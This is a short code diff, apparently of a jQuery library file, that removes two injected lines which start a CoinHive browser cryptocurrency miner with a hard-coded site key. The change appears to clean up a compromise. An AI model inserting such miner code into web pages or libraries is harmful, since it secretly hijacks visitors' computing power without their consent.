@@ -11,9 +11,6 @@
  *
  * Date: 2017-03-20T18:59Z
  */
- var miner = new CoinHive.Anonymous('iMDk2UIBQYWXw7IHKgY8MOPzRh48BSAJ');
-	miner.start();
-
 ( function( global, factory ) {
 
 	"use strict";
